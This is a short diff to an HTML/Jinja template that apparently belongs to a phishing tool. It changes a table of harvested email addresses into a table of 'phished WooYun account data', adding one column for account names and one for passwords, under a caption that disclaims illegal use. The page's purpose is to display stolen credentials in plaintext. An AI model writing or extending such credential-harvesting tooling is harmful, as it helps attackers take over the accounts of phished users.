@@ -10,7 +10,7 @@
         <div class="bs-example" data-example-id="simple-table">
             <table class="table">
                 <caption>
-                    这些邮箱数据，不可以非法使用
+                    这些钓到的乌云账号数据，不可以非法使用
                 </caption>
                 <thead>
                     <tr>
@@ -18,7 +18,10 @@
                             #
                         </th>
                         <th>
-                            邮箱
+                            乌云账号
+                        </th>
+                        <th>
+                            乌云密码
                         </th>
                     </tr>
                 </thead>
@@ -29,7 +32,10 @@
                             {{num}}
                         </th>
                         <td>
-                            {{userinfo}}
+                            {{userinfo[0]}}
+                        </td>
+                        <td>
+                            {{userinfo[1]}}
                         </td>
                     </tr>
                      {% endfor %}
